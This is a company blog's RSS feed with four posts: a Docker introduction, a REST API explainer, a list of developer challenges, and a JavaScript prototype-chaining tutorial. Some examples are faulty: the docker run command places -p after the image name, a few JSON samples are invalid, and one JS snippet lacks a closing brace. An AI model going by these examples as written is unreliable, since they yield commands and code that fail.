<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Personal &#8211; Vivasoft</title>
	<atom:link href="/blog/category/personal/feed/" rel="self" type="application/rss+xml" />
	<link>/</link>
	<description>Top Software Company with Talented Geeks</description>
	<lastBuildDate>Fri, 12 Aug 2022 12:23:46 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.1</generator>

<image>
	<url>/wp-content/uploads/2021/08/cropped-feb-icon-32x32.png</url>
	<title>Personal &#8211; Vivasoft</title>
	<link>/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>What is Docker</title>
		<link>/blog/what-is-docker/</link>
					<comments>/blog/what-is-docker/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Fri, 12 Aug 2022 12:04:02 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[container]]></category>
		<category><![CDATA[devops]]></category>
		<category><![CDATA[docker]]></category>
		<category><![CDATA[image]]></category>
		<guid isPermaLink="false">/?p=10018</guid>

					<description><![CDATA[Docker is an open-source, container technology that allows developers and sysadmins to package applications so that they can be easily moved from one environment to another. This includes their dependencies, libraries, the code itself, and more. Docker&#8217;s use cases are limitless. It can be used as a way to deploy web applications, set up development [&#8230;]]]></description>
										<content:encoded><![CDATA[<p class="maps-to-line">Docker is an open-source, container technology that allows developers and sysadmins to package applications so that they can be easily moved from one environment to another. This includes their dependencies, libraries, the code itself, and more.</p>
<p class="maps-to-line">Docker&#8217;s use cases are limitless. It can be used as a way to deploy web applications, set up development environments, or build libraries of pre-tested components in a reliable and repeatable fashion.</p>
<p class="maps-to-line">As software engineers, We are assigned a task that solves a specific client-related business problem in the IT world. As we try to solve that specific problem, we always use specific tools and technology that will solve that problem efficiently and as quickly as possible. As our software team grows and also each one of us like different OS(Operating System) preferences like someone like MacOS, others like Linux, Many of us like Windows, etc. Now when a new member joins our team, we provide him with a Personal Computer(PC) which he will use to work on. Another member of the team will provide him with the latest project repository so that he can easily set up the project on his new pc to work on. Most of the target focuses on a new team member, and how quickly he/she can contribute to that project. To do so the project should take a minimal amount of time to set up so our new members can start contributing to the project. This same problem occurs when we try to deploy our project solution to the dev, staging, or production server.</p>
<p class="maps-to-line">You may say, what the hell? What that story above mentioned, relates to <strong>Docker</strong>. Let&#8217;s first go through the official definition of docker then we will explain it in simple terms</p>
<blockquote class="maps-to-line"><p>What is Docker? What problem is it trying to solve?</p></blockquote>
<p class="maps-to-line">Also, let&#8217;s try to relate how the above story relates to Docker.</p>
<h2 id="official-definition" class="maps-to-line">Official Definition</h2>
<blockquote class="maps-to-line"><p><strong>Docker</strong> is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker’s methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production.</p></blockquote>
<p class="maps-to-line">The official definition isn&#8217;t that hard to understand, right?</p>
<p class="maps-to-line">Simplified Definition</p>
<blockquote class="maps-to-line"><p><strong>Docker</strong> is a tool to automate the deployment of an application as a lightweight container so that the application can work efficiently in different environments.</p></blockquote>
<blockquote class="maps-to-line"><p>Let&#8217;s try to relate Docker with Our example above.</p></blockquote>
<p class="maps-to-line">As software Engineers, We always heard almost every day that, a project working perfectly on my machine may be some issue with your(another teammate&#8217;s) pc or the server pc and the blame game starts.</p>
<p class="maps-to-line">This is what Docker trying to solve,</p>
<blockquote class="maps-to-line"><p>This works on my machine&#8230;</p></blockquote>
<p class="maps-to-line">Every single project runs on every machine without any problem with minimal dependencies to set up. Project code works fine on the developer machine but as soon as it is deployed or moved to a new teammate&#8217;s pc, it doesn&#8217;t work like it was expected.</p>
<blockquote class="maps-to-line"><p>Docker is like a <strong>blank box</strong> when you as a developer put your files moves into a new place and it works no matter where you place that box.</p></blockquote>
<p class="maps-to-line">This blank box where you put your code, in docker term, it&#8217;s called <strong>Containers</strong>. These containers are the absolute heart of the docker. when every time you take these containers it&#8217;s going to work absolutely and exactly like how it worked on your machine. Docker also allows us to publish this as an image to the public or private registry like docker hub, AWS ECR, Harbor, etc. So that others can also use your code on other projects as if you run on your pc.</p>
<p class="maps-to-line">A simple example can be given like these, Suppose you need an older version of MySQL for a particular project and your pc has the latest version of MySQL so to install the other version of MySQL you need to stop your latest MySQL service and then install the older which is tedious most of the time. But using docker it will take a single command to install the required version of MySQL without stopping your latest MySQL version.</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="bash">docker run --name mymysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:latest -p 3310:3306</pre>
<pre class="hljs"><code>
</code>Let's break down the command for better understanding...</pre>
</div>
<p class="maps-to-line"><code class="inline-code">docker</code>: represents the executable</p>
<p class="maps-to-line"><code class="inline-code">run</code>: this is a subcommand. There&#8217;re lots of other commands. To check we can use <code class="inline-code">docker --help</code>.</p>
<p class="maps-to-line"><code class="inline-code">--name</code>: will set a custom name to the container. If not provided it will set a random name for the container.</p>
<p class="maps-to-line"><code class="inline-code">-e</code>: represents environment variables. if we have multiple environment variables then we have to add <code class="inline-code">-e</code> for each.</p>
<p class="maps-to-line"><code class="inline-code">-d</code>: means to run the container as detached mode.</p>
<p class="maps-to-line"><code class="inline-code">mysql:latest</code>: is the image(a set of instructions) itself which will be used to generate the container.</p>
<p class="maps-to-line"><code class="inline-code">-p</code>: refer to <code class="inline-code">port</code>. we always write like this <code class="inline-code">3310:3306</code> which actually means <code class="inline-code">&lt;local_pc_port&gt;:&lt;container_port&gt;</code>. Also if your PC port and the container port are the same then <code class="inline-code">3306</code> we can exclude the <code class="inline-code">:3306</code>.</p>
<blockquote class="maps-to-line">
<h5 id="noteto-remember-this-i-always-think-like-this-ports-always-start-from-your-local-pc-port-to-the-docker-container-port">Note:To remember this, I always think like this, ports always start from your local pc port to the docker container port.</h5>
</blockquote>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/what-is-docker" rel="nofollow noopener" target="_blank">[Personal blog]</a></p>
<blockquote>
<h4>You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></h4>
</blockquote>
<p class="maps-to-line">In Conclusion, Docker is often used as a “development tool” by developers who want to ensure that they have required dependencies in the development environment without including them in their codebase or having to learn about those dependencies on each new machine that they use for development.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/what-is-docker/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>What is REST API?</title>
		<link>/blog/what-is-rest-api/</link>
					<comments>/blog/what-is-rest-api/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Wed, 10 Aug 2022 06:42:37 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[api]]></category>
		<category><![CDATA[Basics]]></category>
		<category><![CDATA[Http]]></category>
		<category><![CDATA[microservices]]></category>
		<category><![CDATA[REST]]></category>
		<guid isPermaLink="false">/?p=9944</guid>

					<description><![CDATA[Let&#8217;s go through an example to understand what a REST API is. Let&#8217;s say that we work for a cloud kitchen and we want to build a web application that can give you how much stock particular items suppose ice cream flavors are available and the worker working on the physical location of the kitchen [&#8230;]]]></description>
										<content:encoded><![CDATA[<p class="maps-to-line">Let&#8217;s go through an example to understand what a REST API is. Let&#8217;s say that we work for a cloud kitchen and we want to build a web application that can give you how much stock particular items suppose ice cream flavors are available and the worker working on the physical location of the kitchen makes updates to those flavors. So the question arises how do we do this?</p>
<blockquote class="maps-to-line">
<h3 id="the-answer-will-be-with-a-rest-api">The answer will be with a REST API.</h3>
</blockquote>
<p class="maps-to-line">Most of the application today uses 3-tier architecture. Some complex systems can even have an n-tier architecture which we called <code class="inline-code">microservices</code>, which will be explained in another post in the future.<br />
So In 3-tier architecture&#8230;</p>
<ul>
<li class="maps-to-line">Backend (Application tier)</li>
<li class="maps-to-line">Frontend (Presentation tier)</li>
<li class="maps-to-line">Database (Data tier)</li>
</ul>
<p class="maps-to-line">So we have our frontend app or web page communicate with a cloud-based backend server via a REST API. We use the term REST API whenever our Frontend app communicates with our Backend server. So Let&#8217;s jump into what exactly a REST API is.</p>
<h3 id="what-does-rest-stand-for" class="maps-to-line">What does <code class="inline-code">REST</code> stand for?</h3>
<blockquote class="maps-to-line"><p>REST &#8211; Representational State Transfer.</p></blockquote>
<p class="maps-to-line">This is a type of web communications protocol that allows browsers to access data from a server using the HTTP or HTTPS protocols. RESTful architecture is an approach to designing and building software systems such as websites, mobile applications, and web services that use HTTP methods to manipulate resources residing on the server. RESTful APIs are becoming more popular because they are lightweight, easy to use and consume, and easy to read and understand. They allow for easier integration with front-end developers&#8217; code. A RESTful API can be accessed via different devices such as computers and smartphones by using a library or framework known as a client library.</p>
<p class="maps-to-line">It&#8217;s a standardized software architecture style which is a specific type of API that&#8217;s an industry known and used.</p>
<p class="maps-to-line">The first thing that we have to know about REST API is, that they&#8217;re all about communications. So this is how our frontend application communicates with our backend server. Sometimes we also heard RESTFUL Web service, which means is when a service that uses REST APIs to communicate. Let&#8217;s go through some of the benefits of REST API</p>
<ol>
<li class="maps-to-line"><strong>Simple/Standardized</strong> &#8211; approach to communication. We don&#8217;t have to worry about how to format our data or how to format each request coming to our system.</li>
<li class="maps-to-line"><strong>Scale</strong> &#8211; As our service grows in complexity, we can make modifications to handle a large number of requests</li>
<li class="maps-to-line"><strong>Stateless</strong> &#8211; we don&#8217;t have to worry about what data is in which state they&#8217;re in and keep track of that across client and server.</li>
<li class="maps-to-line"><strong>High Performance</strong> &#8211; even though our service gets more complex the performance remains very high.</li>
<li class="maps-to-line"><strong>Cache</strong> &#8211; It supports caching too.</li>
</ol>
<p class="maps-to-line">Let&#8217;s back to our example again, for the cloud kitchen shop, a REST API would look like the below&#8230;</p>
<p class="maps-to-line">We have an endpoint that might look something like this: <code class="inline-code">https://api.littlegiants.io/v1/items</code><br />
So <code class="inline-code">api.littlegiants.io</code> is our DNS(Domain Name Server) for our backend application and the <code class="inline-code">api</code> part signifies it&#8217;s an API subdomain and <code class="inline-code">v1</code> means it&#8217;s the version one of that API and <code class="inline-code">items</code> represents a <code class="inline-code">resource</code>. So, this signifies that we&#8217;re working with the <code class="inline-code">items</code> resource in this REST API.</p>
<p class="maps-to-line">In our example, we can build some blocks to define REST API.</p>
<p class="maps-to-line">First, we have to be able to send a request to the server or a specific service in our case cloud kitchen service. So, for a REST API call <code class="inline-code">request</code> we need to have some blocks.</p>
<p class="maps-to-line">Lets break <code class="inline-code">Request</code> &amp; <code class="inline-code">Response</code> apart a little bit. Let&#8217;s say <code class="inline-code">Request</code> as a big black box.<br />
First things first, let&#8217;s define the type of things that we might want to do with a REST API. What actions or verbs would we want to use when working with one?<br />
As a developer, we have all heard of <code class="inline-code">CRUD</code> &#8211; what does <code class="inline-code">CRUD</code> stands for?</p>
<ul>
<li class="maps-to-line">Create</li>
<li class="maps-to-line">Read</li>
<li class="maps-to-line">Update</li>
<li class="maps-to-line">Delete</li>
</ul>
<p class="maps-to-line">So what&#8217;ll be the equivalent of <code class="inline-code">Create</code> in an HTTP method? Well, it&#8217;s <code class="inline-code">POST</code>. How about <code class="inline-code">Read</code> &#8211; it&#8217;s <code class="inline-code">GET</code>. An update would be <code class="inline-code">PUT</code>, Also Note if you want a partial update we use <code class="inline-code">PATCH</code> and for <code class="inline-code">DELETE</code> we use <code class="inline-code">DELETE</code> HTTP methods.</p>
<p class="maps-to-line">The <code class="inline-code">Request</code> itself has some blocks which will be explained below&#8230;</p>
<ol>
<li class="maps-to-line"><strong>Operation</strong> &#8211; This could be HTTP methods like POST, GET, PUT, PATCH, etc. In our case, we&#8217;ll use PATCH to update the item stock in our application.</li>
<li class="maps-to-line"><strong>Parameters/Body</strong> &#8211; Although this is Optional. In our case, we send a JSON object as a body stating the current stock of the item in our system.</li>
<li class="maps-to-line"><strong>Endpoint</strong> &#8211; This part will be exposed by the cloud kitchen service where we need to send the resource&#8217;s current state to the endpoint. <code class="inline-code">https://api.littlegiants.io/v1/items</code></li>
<li class="maps-to-line"><strong>Headers</strong> &#8211; This is a special part of a REST API request which might have things like an API key or some authentication data.</li>
</ol>
<p class="maps-to-line">The above four points act as a request in a REST API call.</p>
<p class="maps-to-line">So now the question is what will be the response of the REST API call? Typically it&#8217;s some form of raw data, maybe JSON(Which Stands for Javascript Object Notation) or maybe XML(Extended Markup language), etc. In JSON it might look like below</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "message": "items updated"
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">Let&#8217;s look at a few different scenarios that might happen with our cloud kitchen shop. So let&#8217;s say that we want to display what&#8217;s products we&#8217;re selling in the shop. For that, we have to get the items we have in the shop. From the <code class="inline-code">Request</code> point of view how it looks like?<br />
Well, we have the <code class="inline-code">GET</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items</code>, Also parameters can be set to get a single item in the endpoint, headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.<br />
In response, we&#8217;ll get a list of item resources.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    [
        {
            "item_id": 1,
            "name": "Burger",
            "price": 10,
            "stock": 5
        },
        {
            "item_id": 2,
            "name": "Sandwitch",
            "price": 8,
            "stock": 3
        }
    ]
}</pre>
<p class="maps-to-line">So we get some items like burgers, sandwiches, etc. In our shop let&#8217;s say a Sandwich is so popular that it runs out for the day and the store is scrambling and they want to update the stock of that item. So let&#8217;s say they want to update the Sandwich stock so that they can sell Sandwich.<br />
Well, we have the <code class="inline-code">PUT</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items/2</code>, Also parameters 2 represent the Sandwich item in the endpoint also in the body we add the latest stock value as json,</p>
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "name": "Sandwitch",
    "price": 8,
    "stock": 10
}</pre>
<p class="maps-to-line">headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.</p>
<p class="maps-to-line">Let&#8217;s say we want to add a new item in the store like <code class="inline-code">Ice cream</code>. Well, we have the <code class="inline-code">POST</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items</code>, As body, we add the latest item value as json,</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "name": "Ice Cream",
    "price": 4,
    "stock": 10
}</pre>
</div>
<p class="maps-to-line">headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.<br />
In response, we see a response like below</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "item_id": 3
    "name": "Ice Cream",
    "price": 4,
    "stock": 10
}</pre>
</div>
<p class="maps-to-line">Let&#8217;s say some item is not selling at all in the shop so the store owner decided to remove it from the store. Well, we have the <code class="inline-code">DELETE</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items/3</code>, Also parameters 3 represent the item in the endpoint, headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.</p>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/what-is-rest-api" rel="nofollow noopener" target="_blank">[Personal blog]</a></p>
<blockquote>
<h4>You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></h4>
</blockquote>
<p class="maps-to-line">In Conclusion, We&#8217;re hoping that this clarifies what exactly is a REST API. What are some of the benefits? What&#8217;s a real-world example look like and how are the REST APIs fundamental to cloud-based application development?</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/what-is-rest-api/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Shaping the Future: 8 Challenges Every Software Developer Faces &#038; How to Overcome them</title>
		<link>/blog/8-challenges-every-software-developer-faces-and-how-to-overcome-them/</link>
					<comments>/blog/8-challenges-every-software-developer-faces-and-how-to-overcome-them/#respond</comments>
		
		<dc:creator><![CDATA[Nafayeth]]></dc:creator>
		<pubDate>Tue, 31 May 2022 11:00:09 +0000</pubDate>
				<category><![CDATA[Technology]]></category>
		<category><![CDATA[Personal]]></category>
		<guid isPermaLink="false">/?p=8878</guid>

					<description><![CDATA[Software developers are one of the most important people in the technology industry. They face many challenges, but their work is essential to the success of technology companies. Developers are responsible for creating and maintaining software applications. They work with teams of engineers and designers to create products that solve problems and improve efficiency. Despite [&#8230;]]]></description>
										<content:encoded><![CDATA[<p><span style="font-weight: 400;">Software developers are one of the most important people in the technology industry. They face many challenges, but their work is essential to the success of technology companies. Developers are responsible for creating and maintaining software applications. They work with teams of engineers and designers to create products that solve problems and improve efficiency.</span></p>
<p><span style="font-weight: 400;">Despite the importance of their work, developers often face difficult challenges. They must be able to understand complex technical problems and find creative solutions. They also need to be able to communicate effectively with other members of a development team. In addition, they must be able to keep up with rapidly changing technology trends.</span></p>
<p><span style="font-weight: 400;">The challenges that developers face can be difficult, but they are also very rewarding. When a developer creates a new application or solves a difficult problem, they make an important contribution to the success of their company.</span></p>
<p><span style="font-weight: 400;">Software development has come a long way since the early days of computers. However, there are still many unsolved challenges that confront developers every day. </span></p>
<h2><strong>Here are 8 of the most pressing issues that software developers need to keep in mind:</strong></h2>
<p>&nbsp;</p>
<h3><b>1. Staying updated with the evolving technology:</b></h3>
<p><span style="font-weight: 400;">In the world today, technology is constantly evolving. What was once cutting edge is now outdated. Keeping up with the latest trends and technologies can be a daunting task, but it is important in order to stay competitive in the job market and connect with friends and family. There are many ways to stay current with technology, both big and small.</span></p>
<h3><b>2. Learning new programming languages:</b></h3>
<p><span style="font-weight: 400;">In order to stay ahead of the curve in the programming industry, it&#8217;s important to learn new programming languages. With new languages being created every year, it can be tough to keep up. But with the right tools and resources, anyone can learn a new language.</span></p>
<p><span style="font-weight: 400;">One great way to learn a new language is through online courses. There are many websites that offer free or paid courses in various programming languages. Another option is to watch video tutorials on YouTube or other online video platforms. Books are also a great way to learn a language; many books come with exercises and quizzes to help you practice what you&#8217;ve learned.</span></p>
<p><span style="font-weight: 400;">Another way to improve your skills in a programming language is by coding communities. These are online forums where people from all over the world come together to share their code, ask questions, and give feedback.</span></p>
<h3><b>3. Building robust applications:</b></h3>
<p><span style="font-weight: 400;">There are many different ways to build an application. Some applications are more robust than others. A robust application can withstand a lot of different types of abuse. It can also handle a lot of different types of errors. In order to build a robust application, you need to have a good understanding of how the application will be used. You also need to have a good understanding of the underlying technologies that are being used.</span></p>
<h3><b>4. Dealing with difficult code:</b></h3>
<p><span style="font-weight: 400;">There are many difficult code problems that can arise when you are programming. Sometimes, the code is just difficult to read and understand. Other times, the code may be buggy or have unexpected results. In any case, it is important to know how to deal with difficult code problems.</span></p>
<p><span style="font-weight: 400;">The first step is to try to understand the problem. This may require reading the code more than once, and it may help to draw a diagram or write out what you think the code should do. Once you have a good understanding of the problem, you can start trying to fix it.</span></p>
<p><span style="font-weight: 400;">Often, fixing a difficult code problem will require debugging techniques such as stepping through the code line by line or using print statements to see what is happening. You may also need to modify the code in order to make it easier to understand and fix.</span></p>
<h3><b>5. Collaborating with other programmers: </b></h3>
<p><span style="font-weight: 400;">If you&#8217;re a programmer, sooner or later you&#8217;ll need to collaborate with other programmers. Whether you&#8217;re working on a team project or just helping someone else with their code, collaboration is essential for success. But it can also be difficult, especially if you&#8217;re not used to working with others. The good news is that there are many tools available to help you work more effectively. </span></p>
<p><span style="font-weight: 400;">One of the most useful is source control. You can think of source control as a way to keep track of all your changes to a piece of code, and then share them with others so they can make their own changes without getting confused. This is a fundamental part of the open-source development process.</span></p>
<p><span style="font-weight: 400;">Collaborating with other senior programmers can help keep your skills sharp and introduce you to new techniques. When working with others, be sure to set expectations early on about what you hope to get out of the collaboration. It&#8217;s also important to be respectful of others&#8217; time and abilities and be willing to compromise when necessary. By collaborating with other seniors, you&#8217;ll not only improve your own skills but also build strong relationships that can benefit you in the future.</span></p>
<h3><b>6. Maintaining a positive attitude:</b></h3>
<p><span style="font-weight: 400;">Computer programming can be a challenging and frustrating task. It is easy to become negative and give up when problems arise. However, maintaining a positive attitude is key to success as a programmer. When you are positive, you are more likely to keep trying until you find a solution. You will also be more motivated to learn new things and improve your skills. A positive attitude also helps when working with others; it creates a more pleasant work environment and makes it easier to get along with others.</span></p>
<h3><b>7. Remaining organized:</b></h3>
<p><span style="font-weight: 400;">As a programmer, it is important to be organized. This means keeping track of your work and the files that you are working on. One way to do this is to use a source control system such as Git or SVN. These systems allow you to keep track of your changes and merge changes from other developers. They also allow you to go back to earlier versions of your code if needed.</span></p>
<h3><b>8. Developing a personal brand:</b></h3>
<p><span style="font-weight: 400;">As a programmer, you are probably familiar with the importance of developing a strong personal brand. A personal brand can help you stand out from the competition and land your dream job. But how do you go about developing a personal brand? Here are a few tips:</span></p>
<ul>
<li><span style="font-weight: 400;">Figure out what makes you unique. What sets you apart from other programmers? What are your strengths and weaknesses?</span></li>
<li><span style="font-weight: 400;">Create a portfolio that showcases your work. This can include project descriptions, screenshots, and videos of your work in action.</span></li>
<li><span style="font-weight: 400;">Get involved in the programming community. Attend conferences, write blog posts, and participate in online forums and discussion groups.</span></li>
<li><span style="font-weight: 400;">Be active on social media. Platforms like Twitter and LinkedIn offer great opportunities to share your work and connect with other programmers.</span></li>
</ul>
]]></content:encoded>
					
					<wfw:commentRss>/blog/8-challenges-every-software-developer-faces-and-how-to-overcome-them/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>How OOP works in JS (Part 1 &#8211; Prototype and Prototype Chaining)</title>
		<link>/blog/how-oop-works-part-1/</link>
					<comments>/blog/how-oop-works-part-1/#respond</comments>
		
		<dc:creator><![CDATA[Tahsin Siad]]></dc:creator>
		<pubDate>Tue, 01 Mar 2022 17:25:23 +0000</pubDate>
				<category><![CDATA[Personal]]></category>
		<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[javascript]]></category>
		<category><![CDATA[oop]]></category>
		<category><![CDATA[prototype]]></category>
		<category><![CDATA[prototype chaining]]></category>
		<guid isPermaLink="false">/?p=7750</guid>

					<description><![CDATA[Before starting we have to keep in mind that Javascript is not a class-based object-oriented language. Javascript is a prototype based language. Lets see the definition of Class based language and Prototype based Javascript. In the future, a blog will be written discussing the difference between Class based language and Prototype based Javascript. According to [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Before starting we have to keep in mind that <strong>Javascript is not a class-based object-oriented language. Javascript is a prototype based language.</strong> Lets see the definition of Class based language and Prototype based Javascript. In the future, a blog will be written discussing the difference between Class based language and Prototype based Javascript.</p>
<p>According to <strong>Wikipedia,</strong> class-based programming is</p>
<blockquote><p>A style of Object-oriented programming (OOP) in which inheritance occurs via defining classes of objects, instead of inheritance occurring via the objects alone</p></blockquote>
<p>According to <strong>MDN</strong>,</p>
<blockquote><p>A prototype-based language has the notion of a prototypical object, an object used as a template from which to get the initial properties for a new object.</p></blockquote>
<h3><strong>Prototype</strong></h3>
<blockquote><p><strong>Each object has a private property which holds a link to another object called its prototype</strong>.</p></blockquote>
<p>Take a look at this code:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">let name = {
fname: "Tahsin",
lname: "Ahmed"
}
console.log(name.fname);
console.log(name.hasOwnProperty("mname"));</pre>
<p><strong>OUTPUT:</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">Tahsin
false</pre>
<p>The name object has only two properties, <code class="language-">fname</code> and <code class="language-javascript">lname</code>. Where does the <strong>hasOwnProperty</strong> come form? It comes from <strong>Object&#8217;s </strong><code class="language-javascript">[[Prototype]]</code>. By default, every object has it&#8217;s own prototype. If we console it, we will see.</p>
<p><img decoding="async" class="alignnone size-medium wp-image-7753" src="/wp-content/uploads/2022/03/Screenshot-from-2022-02-28-12-14-27-300x254.png" alt="Screenshot from 2022 02 28 12 14 27 How OOP works in JS (Part 1 - Prototype and Prototype Chaining)" width="300" height="254" srcset="/wp-content/uploads/2022/03/Screenshot-from-2022-02-28-12-14-27-300x254.png 300w, /wp-content/uploads/2022/03/Screenshot-from-2022-02-28-12-14-27.png 321w" sizes="(max-width: 300px) 100vw, 300px"><br />
We saw that a lot of properties under <strong>Object</strong>. All these properties are coming from the global <strong>Object</strong> prototype. But, we can modify it as our own requirements.</p>
<h3><strong>Modifying the <code class="language-javascript">__proto__/[[Prototype]]</code> property</strong></h3>
<p>Please see the example below:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">function Person(name, age) {
let personObj = Object.create(constructorObject);
personObj.name = name;
personObj.age = age;
return personObj;
}

let constructorObject = {
speak: function(){
return "Man is mortal"
}

let bingo = Person("Bingo", 54);
console.log(bingo);</pre>
<p><img decoding="async" class="alignnone size-medium wp-image-7755" src="/wp-content/uploads/2022/03/Screenshot-from-2022-02-28-13-01-57-300x261.png" alt="Screenshot from 2022 02 28 13 01 57 How OOP works in JS (Part 1 - Prototype and Prototype Chaining)" width="300" height="261" srcset="/wp-content/uploads/2022/03/Screenshot-from-2022-02-28-13-01-57-300x261.png 300w, /wp-content/uploads/2022/03/Screenshot-from-2022-02-28-13-01-57.png 352w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>Notice the <code class="language-javascript">__proto__</code> property and the speak method? <code>Object.create</code> uses the argument passed to it to become the prototype.</p>
<p>Let&#8217;s regenerate this using <code class="language-javascript">new</code> keyword.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">function Person(name, age) {
this.name = name;
this.age = age;
}
Person.prototype.speak = function() {
return "Man is mortal";
}
let john = new Person("John", 45);
console.log(john);</pre>
<p>If we console it from browser, we will get the same output as before. But, you may notice that, another <code class="language-cpp">__proto__</code> exists under the Person <code class="language-cpp">[[Prototype]</code>. It is called <strong>Prototype Chaining</strong>.</p>
<h3><strong>Prototype Chaining</strong></h3>
<p>We can wrap all these things reminding the short explanation of MDN which is given below:</p>
<blockquote><p>Each object has a private property which holds a link to another object called its <strong>prototype.</strong> That prototype object has a prototype of its own, and so on until an object is reached with <code class="language-apache">null</code> as its prototype. By definition, <code class="language-apache">null</code> has no prototype, and acts as the final link in this <strong>prototype chain</strong>.</p></blockquote>
<p>Let&#8217;s try a example for Prototype Chaining.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">let f = function () {
this.a = 1;
this.b = 2;
}

let o = new f();

f.prototype.b = 3;
f.prototype.c = 4;

console.log(o.a);
console.log(o.b);
console.log(o.c);
console.log(o.d);</pre>
<p><strong>OUTPUT:</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">1
2
4
undefined</pre>
<p><strong>How this code does work? Why does  </strong><code class="language-apache">console.log(o.d)</code> <strong>give us</strong> <code class="language-javascript">undefined</code><strong>?</strong></p>
<ol>
<li> Firstly, we create a function named f</li>
<li>Creating a object from function f.</li>
<li>Adding two properties <code class="language-apache">b</code> and <code class="language-apache">c</code>  in function f prototype. But, you can&#8217;t add prototype like <code class="language-apache">{ b: 3, c: 4 }</code>. Because, this will <strong>break prototype chaining</strong>.</li>
<li>After adding properties, the whole scenario looks like this.
<ul>
<li><code class="language-apache">o.[[Prototype]]</code> has properties <code class="language-apache">b and c</code>.</li>
<li><code class="language-apache">o.[[Prototype]].[[Prototype]]</code> is <strong>Object.prototype</strong>.</li>
<li>Finally, <code>o.[[Prototype]].[[Prototype]].[[Prototype]]</code> is <code>null</code>.<br />
&#8211; This is the <strong>end</strong> of the prototype chain, as <code>null</code>, by definition, has no <code>[[Prototype]]</code>.</li>
<li>Thus, the full prototype chain looks like: <code>{ a: 1, b: 2 } ---&gt; { b: 3, c: 4 } ---&gt; Object.prototype ---&gt; null</code>.</li>
</ul>
</li>
<li>As <code>o</code> contains <code>a</code>, so, it prints <strong>1</strong>.</li>
<li>As <code>o</code> contains <code>b</code>, so, it prints <strong>2</strong>. You may see that <code>b</code> is also found <code>o.[[Prototype]]</code>. By default, object <span data-dobid="hdw">prioritize</span>s it&#8217;s own property first, then goes to it&#8217;s prototype if not found. This is <strong>Property Shadowing</strong>.</li>
<li><code>c</code> exists in <code>o.[[Prototype]]</code> , so, first it tries to find it from it&#8217;s own property. But, not found, then searches into it&#8217;s <code>o.[[Prototype]]</code>. Yeah, found it!!!.</li>
<li>In case of <code>d</code> we get <code>undefined</code>, the same thing goes for it also. It follows those steps:
<ul>
<li>Is there a <code>d</code> own property on <code>o</code>? <strong>No</strong>, check its <code>prototype</code>.</li>
<li>Is there a <code>d</code> own property on <code>o.[[Prototype]]</code>? <strong>No</strong>, check its <code>prototype</code></li>
<li><code>o.[[Prototype]].[[Prototype]]</code> is <strong>Object.prototype</strong> and there is no <code>d</code> property by default, check its <strong>prototype</strong></li>
<li><code>o.[[Prototype]].[[Prototype]].[[Prototype]]</code> is <code>null</code>, <strong>stop</strong> searching</li>
<li>no property found, return <code>undefined</code></li>
</ul>
</li>
</ol>
